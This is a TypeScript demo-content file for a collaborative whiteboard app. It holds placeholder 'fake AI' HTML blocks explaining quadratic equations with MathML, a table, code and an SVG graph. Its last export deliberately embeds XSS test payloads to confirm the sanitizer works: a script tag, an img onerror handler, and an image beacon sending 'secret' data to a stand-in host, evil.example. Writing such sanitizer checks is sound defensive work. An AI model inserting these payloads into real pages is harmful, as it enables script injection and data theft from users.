/**
 * 「假 AI」的演示内容（临时文件，M2 接上真模型后删掉）
 *
 * 存在的意义：先把「AI 写板面」这条**链路**验证通，而不是等模型接上了才发现
 * 内容层、净化、增量更新有问题。
 *
 * 这些 HTML 故意用了白板最需要、而聊天框最难表达的东西：
 *   · MathML 公式（浏览器原生渲染）
 *   · 表格
 *   · 代码块
 *   · 内联 SVG 小图
 */

const STEP_1 = (n: number): string => `
  <h3>第 ${n} 步 · 把方程化成标准形式</h3>
  <p>一元二次方程的标准形式是：</p>
  <math display="block">
    <mi>a</mi><msup><mi>x</mi><mn>2</mn></msup>
    <mo>+</mo>
    <mi>b</mi><mi>x</mi>
    <mo>+</mo>
    <mi>c</mi>
    <mo>=</mo>
    <mn>0</mn>
    <mspace width="1em"></mspace>
    <mo stretchy="false">(</mo><mi>a</mi><mo>&#x2260;</mo><mn>0</mn><mo stretchy="false">)</mo>
  </math>
  <p>先把所有项移到等号左边，按 <code>x²</code>、<code>x</code>、常数项的顺序排好。</p>
`;

const STEP_2 = (n: number): string => `
  <h3>第 ${n} 步 · 判别式决定根的情况</h3>
  <p>判别式记作 <math><mi>&#x0394;</mi><mo>=</mo><msup><mi>b</mi><mn>2</mn></msup><mo>&#x2212;</mo><mn>4</mn><mi>a</mi><mi>c</mi></math>，它决定根的个数：</p>
  <table>
    <thead>
      <tr><th>判别式</th><th>根的情况</th></tr>
    </thead>
    <tbody>
      <tr><td><math><mi>&#x0394;</mi><mo>&gt;</mo><mn>0</mn></math></td><td>两个不相等的实根</td></tr>
      <tr><td><math><mi>&#x0394;</mi><mo>=</mo><mn>0</mn></math></td><td>两个相等的实根</td></tr>
      <tr><td><math><mi>&#x0394;</mi><mo>&lt;</mo><mn>0</mn></math></td><td>没有实根</td></tr>
    </tbody>
  </table>
  <p><strong>常见错误：</strong>忘记先算判别式就直接套求根公式，导致在无实根时也算出结果。</p>
`;

const STEP_3 = (n: number): string => `
  <h3>第 ${n} 步 · 求根公式</h3>
  <math display="block">
    <mi>x</mi>
    <mo>=</mo>
    <mfrac>
      <mrow>
        <mo>&#x2212;</mo><mi>b</mi>
        <mo>&#x00B1;</mo>
        <msqrt>
          <msup><mi>b</mi><mn>2</mn></msup>
          <mo>&#x2212;</mo><mn>4</mn><mi>a</mi><mi>c</mi>
        </msqrt>
      </mrow>
      <mrow><mn>2</mn><mi>a</mi></mrow>
    </mfrac>
  </math>
  <p>把它记成一段代码就是：</p>
  <pre><code>const x1 = (-b + Math.sqrt(d)) / (2 * a);
const x2 = (-b - Math.sqrt(d)) / (2 * a);</code></pre>
  <p>注意 <code>d = b*b - 4*a*c</code>，先判断 <code>d &gt;= 0</code> 再开方。</p>
`;

const STEP_4 = (n: number): string => `
  <h3>第 ${n} 步 · 画个图看看</h3>
  <p>抛物线 <math><mi>y</mi><mo>=</mo><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>b</mi><mi>x</mi><mo>+</mo><mi>c</mi></math> 与 x 轴的交点，就是方程的根：</p>
  <svg viewBox="0 0 220 120" width="220" height="120" role="img" aria-label="抛物线与 x 轴的两个交点">
    <line x1="10" y1="90" x2="210" y2="90" stroke="#9ca3af" stroke-width="1.5"></line>
    <line x1="110" y1="10" x2="110" y2="115" stroke="#9ca3af" stroke-width="1.5"></line>
    <path d="M30 20 Q110 160 190 20" fill="none" stroke="#2563eb" stroke-width="2.5"></path>
    <circle cx="57" cy="90" r="4" fill="#e5484d"></circle>
    <circle cx="163" cy="90" r="4" fill="#e5484d"></circle>
  </svg>
  <p>两个红点就是两个实根。判别式小于 0 时，曲线整个在 x 轴上方，没有交点。</p>
`;

const STEPS: readonly ((n: number) => string)[] = [STEP_1, STEP_2, STEP_3, STEP_4];

/** 生成第 n 个演示块（循环使用四种样式） */
export function demoBlock(n: number): string {
  const maker = STEPS[(n - 1) % STEPS.length] ?? STEP_1;
  return maker(n);
}

/**
 * 「改写」用的内容 —— **故意塞了危险的东西**。
 *
 * 用来肉眼确认净化真的生效：
 *   · <script> 改标题
 *   · <img onerror> 改标题
 *   · 外链图片当信标外发数据
 *
 * 如果净化正常，这三样都不会起作用，页面标题应该始终是「共写白板」。
 */
export const DEMO_REWRITE = `
  <h3>这一块被「改写」了（op: set）</h3>
  <p>只有这一块被替换，其它块没有被重建 —— 所以你画在别处的笔记不会受影响。</p>
  <p>这块内容里故意塞了 <code>&lt;script&gt;</code>、<code>onerror</code> 和外链图片，
  它们<b>都应该被净化掉</b>。页面看不出任何异常，就说明拦住了。</p>
  <script>document.title = '被 XSS 了';</script>
  <img src="https://evil.example/collect?data=secret" onerror="document.title='被 XSS 了'">
`;
